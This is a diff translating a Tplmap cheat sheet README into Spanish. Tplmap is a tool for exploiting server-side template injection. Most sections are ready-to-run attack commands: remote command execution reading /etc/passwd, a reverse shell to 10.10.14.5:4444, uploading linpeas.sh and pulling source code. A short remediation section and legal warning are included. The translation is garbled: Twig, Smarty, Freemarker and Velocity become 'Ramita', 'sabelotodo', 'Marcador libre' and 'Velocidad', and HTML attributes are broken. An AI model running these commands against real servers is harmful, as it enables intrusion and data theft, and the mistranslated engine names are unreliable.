@@ -1,12 +1,16 @@
-# 🎭 Tplmap - Guía de referencia completa
-
 <!-- language-home-navigation -->
-[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)
+[🏠 Página Principal Española](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)
 
-[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)
+[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)
+
+[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)
+
+---
 
 
+# 🎭 Tplmap - Hoja de referencia completa
 
+[🇹🇷 Türkçe Sürüm](traducciones/README.tr.md)
 ```
   ████████╗██████╗ ██╗     ███╗   ███╗ █████╗ ██████╗ 
   ╚══██╔══╝██╔══██╗██║     ████╗ ████║██╔══██╗██╔══██╗
@@ -16,61 +20,59 @@
      ╚═╝   ╚═╝     ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     
        Server-Side Template Injection (SSTI) Automated Exploiter
 ```
-
-<p align="center">
+<p align="centro">
   <img src="https://img.shields.io/badge/Tplmap-SSTI_Exploitation-blue?style=for-the-badge" alt="Tplmap">
-  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-orange?style=for-the-badge" alt="Web Security & API">
-  <img src="https://img.shields.io/badge/Engines-Jinja2_Twig_Mako_Freemarker-green?style=for-the-badge" alt="Template Engines">
-  <img src="https://img.shields.io/badge/License-GPLv2-red?style=for-the-badge" alt="License GPLv2">
+  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-orange?style=for-the-badge" alt="Seguridad web y API">
+  <img src="https://img.shields.io/badge/Engines-Jinja2_Twig_Mako_Freemarker-green?style=for-the-badge" alt="Motores de plantilla">
+  <img src="https://img.shields.io/badge/License-GPLv2-red?style=for-the-badge" alt="Licencia GPLv2">
 </p>
 
-<p align="center">
-  <b>🌐 Automated exploitation tool designed to detect and exploit Server-Side Template Injection (SSTI) vulnerabilities to achieve Remote Code Execution</b>
+<p align="centro">
+  <b>🌐 Herramienta de explotación automatizada diseñada para detectar y explotar vulnerabilidades de inyección de plantillas del lado del servidor (SSTI) para lograr la ejecución remota de código</b>
 </p>
 
 ---
 
 ## 📋 Tabla de contenidos
 
-- [Introducción](#-overview--the-ssti-vulnerability)
-- [Supported Template Engines](#-supported-template-engines)
-- [Instalación](#-installation)
-- [Basic Vulnerability Detection](#-basic-vulnerability-detection)
-- [Targeting Specific Injection Points (`*` marker)](#-targeting-specific-injection-points--marker)
-- [Remote Command Execution (`--os-cmd`)](#-remote-command-execution---os-cmd)
-- [Interactive Shells & Reverse Connections](#-interactive-shells--reverse-connections)
-- [File Upload & Download](#-file-upload--download)
-- [Testing POST Data & Headers](#-testing-post-data--headers)
-- [Referencia rápida](#-quick-reference-table)
-- [Defensive Considerations & Remediation](#-defensive-considerations--remediation)
-- [Legal Disclaimer](#-legal-disclaimer)
+- [Descripción general y vulnerabilidad SSTI] (#-descripción general--la-vulnerabilidad-ssti)
+- [Motores de plantillas compatibles](#-motores-de-plantillas-compatibles)
+- [Instalación](#-instalación)
+- [Detección de vulnerabilidad básica](#-detección-de-vulnerabilidad-básica)
+- [Apuntar a puntos de inyección específicos (marcador `*`)](#-apuntar a puntos de inyección específicos--marcador)
+- [Ejecución de comando remoto (`--os-cmd`)](#-ejecución-de-comando-remoto---os-cmd)
+- [Shells interactivos y conexiones inversas](#-shells-interactivos--conexiones-inversas)
+- [Carga y descarga de archivos] (#-carga-archivo--descarga)
+- [Prueba de datos y encabezados POST] (#-testing-post-data--headers)
+- [Tabla de referencia rápida](#-tabla-de-referencia-rápida)
+- [Consideraciones defensivas y remediación](#-consideraciones-defensivas--remediación)
+- [Aviso legal](#-aviso-legal)
 
 ---
 
-## 🎯 Introducción
+## 🎯 Descripción general y vulnerabilidad SSTI
 
-**Server-Side Template Injection (SSTI)** occurs when an application embeds unvalidated user input directly into a server-side template rather than passing it as data to be rendered. Because modern template engines allow syntax like `{{7*7}}` or `${7*7}`, attackers can break out of the sandbox and access the underlying runtime environment (Python, Java, PHP, Ruby, Node.js).
+La **Inyección de plantilla del lado del servidor (SSTI)** ocurre cuando una aplicación incorpora entradas de usuario no validadas directamente en una plantilla del lado del servidor en lugar de pasarlas como datos para ser representados. Debido a que los motores de plantillas modernos permiten sintaxis como `{{7*7}}` o `${7*7}`, los atacantes pueden salir del entorno limitado y acceder al entorno de ejecución subyacente (Python, Java, PHP, Ruby, Node.js).
 
-Written by **Miroslav Stampar** and **Emilio Pinna**, **Tplmap** acts as the "SQLMap for Template Engines". It automatically fingerprints the active template engine, breaks out of template evaluation contexts, and escalates code execution to full OS-level shell access.
+Escrito por **Miroslav Stampar** y **Emilio Pinna**, **Tplmap** actúa como "SQLMap para motores de plantillas". Automáticamente toma huellas digitales del motor de plantilla activo, sale de los contextos de evaluación de la plantilla y escala la ejecución del código al acceso completo al shell a nivel del sistema operativo.
 
 ---
 
-## 🧩 Supported Template Engines
+## 🧩 Motores de plantillas compatibles
 
-|Language|Template Engines Supported|
-|----------|----------------------------|
-|**Python**|Jinja2, Mako, Tornado, Nunjucks|
-|**PHP**|Twig, Smarty|
-|**Java**|Freemarker, Velocity|
-|**Ruby**|ERB, Slim|
-|**Node.js**|Jade, Pug, Dust.js|
+| Idioma | Motores de plantillas compatibles |
+|----------|----------------------|
+| **Python** | Jinja2, Mako, Tornado, Nunjucks |
+| **PHP** | Ramita, sabelotodo |
+| **Java** | Marcador libre, Velocidad |
+| **Rubí** | ERB, delgado |
+| **Nodo.js** | Jade, Pug, Dust.js |
 
 ---
 
 ## 📥 Instalación
 
-|**Node.js**|Jade, Pug, Dust.js|
-
+Tplmap está construido en Python:
 ```bash
 # Clone GitHub repository
 git clone https://github.com/epinna/tplmap.git
@@ -82,11 +84,9 @@ pip install -r requirements.txt
 # Verify installation
 python tplmap.py --help
 ```
-
 ---
 
-## 🚀 Basic Vulnerability Detection
-
+## 🚀 Detección básica de vulnerabilidades
 ```bash
 # Scan a GET parameter for SSTI
 python tplmap.py -u "http://target.local/page?name=John"
@@ -94,13 +94,11 @@ python tplmap.py -u "http://target.local/page?name=John"
 # Mark explicit injection point using an asterisk (*)
 python tplmap.py -u "http://target.local/profile?id=1&bio=*"
 ```
-
 ---
 
-## 💻 Remote Command Execution (`--os-cmd`)
+## 💻 Ejecución remota de comandos (`--os-cmd`)
 
-Once Tplmap detects the engine (e.g., Jinja2), execute arbitrary shell commands directly:
-
+Una vez que Tplmap detecta el motor (por ejemplo, Jinja2), ejecute comandos de shell arbitrarios directamente:
 ```bash
 # Execute whoami on target
 python tplmap.py -u "http://target.local/page?name=*" --os-cmd "whoami; id"
@@ -108,11 +106,9 @@ python tplmap.py -u "http://target.local/page?name=*" --os-cmd "whoami; id"
 # Read sensitive configuration files
 python tplmap.py -u "http://target.local/page?name=*" --os-cmd "cat /etc/passwd"
 ```
-
 ---
 
-## 💀 Interactive Shells & Reverse Connections
-
+## 💀 Conchas interactivas y conexiones inversas
 ```bash
 # Spawn an interactive pseudo-terminal within Tplmap
 python tplmap.py -u "http://target.local/page?name=*" --os-shell
@@ -121,13 +117,11 @@ python tplmap.py -u "http://target.local/page?name=*" --os-shell
 python tplmap.py -u "http://target.local/page?name=*" \
   --reverse-shell 10.10.14.5 4444
 ```
-
 ---
 
-## 📁 File Upload & Download
+## 📁 Carga y descarga de archivos
 
-Exfiltrate source code or upload persistence tools:
-
+Exfiltre el código fuente o cargue herramientas de persistencia:
 ```bash
 # Download remote source code or configuration
 python tplmap.py -u "http://target.local/page?name=*" \
@@ -137,11 +131,9 @@ python tplmap.py -u "http://target.local/page?name=*" \
 python tplmap.py -u "http://target.local/page?name=*" \
   --upload ./linpeas.sh /tmp/linpeas.sh
 ```
-
 ---
 
-## 🌐 Testing POST Data & Headers
-
+## 🌐 Prueba de datos y encabezados POST
 ```bash
 # Test POST body parameters
 python tplmap.py -u "http://target.local/comment" -d "author=test&comment=*"
@@ -152,31 +144,30 @@ python tplmap.py -u "http://target.local/dashboard" -H "User-Agent: *"
 # Test behind authenticated session cookies
 python tplmap.py -u "http://target.local/welcome?user=*" -c "session=xyz123"
 ```
+---
+
+## ⚡ Tabla de referencia rápida
+
+| Objetivo | Comando |
+|-----------|------------------|
+| **Detectar SSTI en URL** | `python tplmap.py -u "<URL>?param=*"` |
+| **Ejecutar comando remoto** | `python tplmap.py -u "<URL>" --os-cmd="<CMD>"` |
+| **Terminal interactiva** | `python tplmap.py -u "<URL>" --os-shell` |
+| **Soltar carcasa inversa** | `python tplmap.py -u "<URL>" --reverse-shell <IP> <PORT>` |
+| **Descargar archivo remoto** | `python tplmap.py -u "<URL>" --download <REMOTE> <LOCAL>` |
+| **Subir archivo local** | `python tplmap.py -u "<URL>" --upload <LOCAL> <REMOTE>` |
+| **Cuerpo de la publicación de prueba** | `python tplmap.py -u "<URL>" -d "data=*"` |
 
 ---
 
-## ⚡ Referencia rápida
+## 🛡️ Consideraciones defensivas y remediación
 
-|Objective|Comando|
-|-----------|---------|
-|**Detect SSTI in URL**|`python tplmap.py -u "<URL>?param=*"`|
-|**Execute Remote Command**|`python tplmap.py -u "<URL>" --os-cmd="<CMD>"`|
-|**Interactive Terminal**|`python tplmap.py -u "<URL>" --os-shell`|
-|**Drop Reverse Shell**|`python tplmap.py -u "<URL>" --reverse-shell <IP> <PORT>`|
-|**Download Remote File**|`python tplmap.py -u "<URL>" --download <REMOTE> <LOCAL>`|
-|**Upload Local File**|`python tplmap.py -u "<URL>" --upload <LOCAL> <REMOTE>`|
-|**Test POST Body**|`python tplmap.py -u "<URL>" -d "data=*"`|
+1. **Escapado según el contexto:** Nunca concatene entradas sin formato del usuario en cadenas de plantilla. Utilice el mecanismo de enlace de variables nativo del motor de plantillas (por ejemplo, en Jinja2: `render_template('hello.html', name=user_input)` en lugar de `render_template_string(f"Hello {user_input}")`).
+2. **Restricciones de la zona de pruebas:** Aplique una zona de pruebas estricta dentro de los motores donde la representación dinámica es inevitable, no permitiendo el acceso a `__class__`, `__mro__` u objetos de reflexión.
 
 ---
 
-## 🛡️ Defensive Considerations & Remediation
+## ⚠️ Aviso legal
 
-1. **Context-Aware Escaping:** Never concatenate raw user input into template strings. Use the template engine's native variable binding mechanism (e.g., in Jinja2: `render_template('hello.html', name=user_input)` rather than `render_template_string(f"Hello {user_input}")`).
-2. **Sandbox Restrictions:** Enforce strict sandboxing within engines where dynamic rendering is unavoidable, disallowing access to `__class__`, `__mro__`, or reflection objects.
-
----
-
-## ⚠️ Legal Disclaimer
-
-3. **Honeytokens:** Plant attractive DNS records (e.g., `backup-vault.corp.local` or `admin-portal.corp.local`) pointing to honeypot IP addresses.
-> Tplmap executes arbitrary remote code on target application servers. Testing or exploiting web applications without prior written authorization is strictly illegal.
+> [!PRECAUCIÓN]
+> Tplmap ejecuta código remoto arbitrario en los servidores de aplicaciones de destino. Probar o explotar aplicaciones web sin autorización previa por escrito es estrictamente ilegal.
